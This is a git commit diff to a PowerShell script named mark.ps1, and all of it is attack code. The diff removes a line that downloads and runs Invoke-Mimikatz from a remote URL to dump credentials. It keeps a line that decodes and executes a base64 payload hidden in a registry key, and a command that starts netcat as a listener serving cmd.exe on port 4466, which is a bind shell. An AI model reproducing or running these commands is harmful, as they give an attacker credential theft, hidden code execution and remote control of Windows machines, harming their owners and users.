bd2644d215eb4beed00fb0c181be4ea6fcf3fc3c
inwestallis <inwestallis@gmail.com>
2020-03-01 12:45:54 +0300

    Update mark.ps1

--- mark.ps1
+++ mark.ps1
@@ -1,6 +1,5 @@
-iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\XSample').XXX)))
 
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds
+iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\XSample').XXX)))
 
 $Command = "$Env:temp\nc64.exe -nLvp 4466 -e cmd.exe"
 Invoke-Expression $Command
